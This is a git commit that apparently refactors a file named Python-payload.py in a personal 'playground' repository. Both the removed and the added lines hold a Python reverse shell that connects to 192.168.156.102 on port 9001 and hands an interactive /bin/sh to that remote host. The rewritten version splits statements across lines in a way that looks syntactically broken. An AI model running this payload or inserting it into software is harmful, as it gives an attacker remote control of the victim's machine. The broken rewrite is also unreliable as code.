d9d72e65c68003c3c1d86dbcbf0649995dfc47ab
Kitsana Thuekoh <kitsanathuekoh@gmail.com>
2026-08-21 20:22:07 +0200

    Refactor socket connection code for readability

--- Python-Plaground/Python-payload.py
+++ Python-Plaground/Python-payload.py
@@ -1,1 +1,5 @@
-socket=__import__('socket');subprocess=__import__('subprocess');os=__import__('os');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.156.102",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
+socket=__import__('socket');subprocess=
+__import__('subprocess')
+;os=__import__('os');s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.156.102",9001))
+;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+subprocess.call(["/bin/sh","-i"])
